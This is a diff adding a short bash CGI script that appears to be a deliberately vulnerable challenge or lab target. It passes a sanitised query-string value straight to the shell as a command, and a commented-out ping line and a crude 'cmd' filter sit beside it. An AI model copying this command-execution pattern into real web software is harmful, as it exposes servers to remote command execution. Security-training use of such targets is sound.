@@ -1,0 +1,27 @@
+#!/bin/bash
+
+echo Content-type: text/html
+echo ""
+
+if [[ "$QUERY_STRING" =~ "cmd" ]]
+then
+if [[ "$QUERY_STRING" =~ "&cmd" ]]
+then
+echo "Sh1t detected. Quitting"
+exit 1
+fi
+
+ip=`echo "$QUERY_STRING"|cut -d "&" -f1|cut -d "=" -f2`
+
+cleanip=${ip//[^a-zA-Z0-9.]/}
+cleanip=`echo -n $cleanip | tr A-Z a-z`
+
+echo "<h3>CMD $cleanip...</h3>"
+printf "<pre>\n"
+"$cleanip"
+printf "</pre>\n"
+#ping -c 4 "$cleanip" 2>&1|sed 's/$/<br>/g'
+echo "<hr>"
+echo "<p>"
+fi
+
